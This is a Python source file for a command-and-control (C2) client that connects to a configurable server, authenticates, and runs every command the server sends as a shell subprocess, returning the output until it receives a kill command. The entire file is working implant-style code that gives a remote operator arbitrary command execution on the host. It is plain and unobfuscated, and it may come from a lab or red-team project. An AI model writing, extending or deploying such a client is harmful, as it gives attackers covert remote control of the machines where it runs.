import asyncio
import logging
import time
import uuid
import argparse
from models.command_type import CommandType
from models.communication_manager import CommunicationManager
import helper.subprocess as subprocess_helper
import helper.auth as auth_helper
import helper.helper_funcs as helper_funcs
from models.connection_manager import ConnectionManager

# ==================== CONFIGURATION ====================

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(name)s|%(funcName)s:%(lineno)d] %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# ==================== CORE C2 CLIENT LOGIC ====================


class C2Client:
    """Main C2 Client"""
    
    def __init__(self, server_host: str, server_port: int, client_id: str):
        self.server_host = server_host
        self.server_port = server_port
        self.client_id = client_id
        self.connection_manager = ConnectionManager(server_host, server_port, client_id)
        self.communication_manager = None
        self._communication_ready = asyncio.Event()
        self._executor_task = None
        self.execution_process = None
        self.is_alive = True



    async def _lifecycle(self):
        """
        Main client loop - handles communication lifecycle
        """
        self.communication_manager = CommunicationManager(self.connection_manager)
        
        try:
            # Wait for initial connection
            await self.connection_manager.wait_connected()
            
            while self.is_alive:
                # Wait for connection to be ready
                await self.connection_manager.wait_connected()
                
                if not self.is_alive:
                    break
                
                # Authenticate and handshake
                if not auth_helper.validate_server_certificate(self.connection_manager.writer):
                    self.is_alive = False
                    raise ConnectionError("Server certificate is not valid")
                
                if not await self.communication_manager.perform_handshake(self.client_id):
                    logger.error("Handshake failed, will retry")
                    await asyncio.sleep(1)
                    continue
                
                # Signal executor that communication is ready
                self._communication_ready.set()
                
                # Start communication
                await self.communication_manager.start_communication()
                
                # Communication dropped, clear ready flag
                self._communication_ready.clear()
                
        except asyncio.CancelledError:
            logger.info("Lifecycle cancelled")
        except ConnectionError as e:
            logger.error(f"Lifecycle connection error: {e}")
        except Exception as e:
            logger.error(f"Lifecycle error: {e}")
        finally:
            self._communication_ready.clear()
            if self.communication_manager:
                self.communication_manager.stop()
            


    async def _executor(self):
        """
        Execute commands from queue
        """
        try:
            while self.is_alive:
                # Wait for communication to be ready
                await self._communication_ready.wait()
                
                if not self.is_alive:
                    break
                
                command_data = await self.communication_manager.receive_command()
                if command_data is None:
                    continue
                    
                cmd_id, result, exec_time_ms = await self._process_command(command_data)
                
                if not self.is_alive:
                    break
                    
                await self.communication_manager.send_result(cmd_id, result, exec_time_ms)
            else:
                logger.info("Executor exiting | client not alive")
            
        except asyncio.CancelledError:
            logger.info('Executor cancelled')
            raise
        except Exception as e:
            logger.error(f"Executor error: {e}")
            raise
        finally:
            logger.info("Executor finished")















    async def _process_command(self, command_data: tuple[str, str]) -> tuple[str, str, float]:
        cmd_id, command = command_data
        start_time = time.monotonic()
        
        if command == CommandType.KILL.value:
            result = "Client killed by server"
            await self._terminate_execution_process()
            self.is_alive = False
        else:
            result = await self._execute_command(cmd_id, command)
            
        exec_time_ms = (time.monotonic() - start_time) * 1000
        logger.info(f"Executed: {command} ({exec_time_ms:.1f}ms)")
        return cmd_id, result, exec_time_ms

    async def _execute_command(self, cmd_id: str, command: str) -> str:
        """
        Execute bash-style command
        """
        try:
            self.execution_process = await subprocess_helper.create_subprocess(command)
            logger.info(f"[cmd id: {cmd_id}] Execution process created (pid: {self.execution_process.pid})")
            output = await subprocess_helper.communicate_subprocess(self.execution_process)
            self.execution_process = None
            return output
        except asyncio.CancelledError:
            await self._terminate_execution_process()
            raise            
        except Exception as e:
            logger.error(f"Command execution error: {str(e)}")
            return f"Error: {str(e)}"

    async def _terminate_execution_process(self):
        """Terminate execution process if it exists"""
        if not self.execution_process:
            return
        pid = self.execution_process.pid
        try:
            await subprocess_helper.terminate_subprocess_gracefully(self.execution_process)
            self.execution_process = None
            logger.info(f"Terminated execution process gracefully (pid: {pid})")
        except asyncio.TimeoutError:
            logger.error("Graceful termination timed out")
        except Exception as e:
            logger.error(f"Error gracefully terminating process: {e}")
        finally:
            if not self.execution_process:
                return
            try:
                await subprocess_helper.terminate_subprocess_forcefully(self.execution_process)
                self.execution_process = None
                logger.info(f"Terminated execution process forcefully (pid: {pid})")
            except Exception as e:
                logger.error(f"Error forcefully terminating process: {e}")





    async def start(self):
        """Start the C2 client"""
        logger.info(f"Starting C2 client (ID: {self.client_id})")
        try:
            # Start connection manager with background reconnection
            await self.connection_manager.start()
            
            # Start executor and lifecycle
            self._executor_task = asyncio.create_task(self._executor(), name='executor')
            await self._lifecycle()
        except asyncio.CancelledError:
            logger.info("Client start cancelled")
        except Exception as e:
            logger.error(f"Client start error: {e}")
        finally:
            await helper_funcs.cancel_task(self._executor_task)
            await self._terminate_execution_process()
            await self.connection_manager.close()
            logger.info("C2 Client stopped")

# ==================== MAIN ====================

async def main():
    parser = argparse.ArgumentParser(description="C2 Client")
    parser.add_argument("--server-host", default="127.0.0.1", help="Server host")
    parser.add_argument("--server-port", type=int, default=5000, help="Server port")
    parser.add_argument("--client-id", default=None, help="Client ID (auto-generated if not provided)")

    args = parser.parse_args()

    # Generate client ID if not provided
    client_id = args.client_id or f"client-{uuid.uuid4().hex[:8]}"
    
    client = C2Client(args.server_host, args.server_port, client_id)
    
    try:
        await client.start()
    except KeyboardInterrupt:
        logger.info("Client shutdown")
        client.is_alive = False

if __name__ == "__main__":
    asyncio.run(main())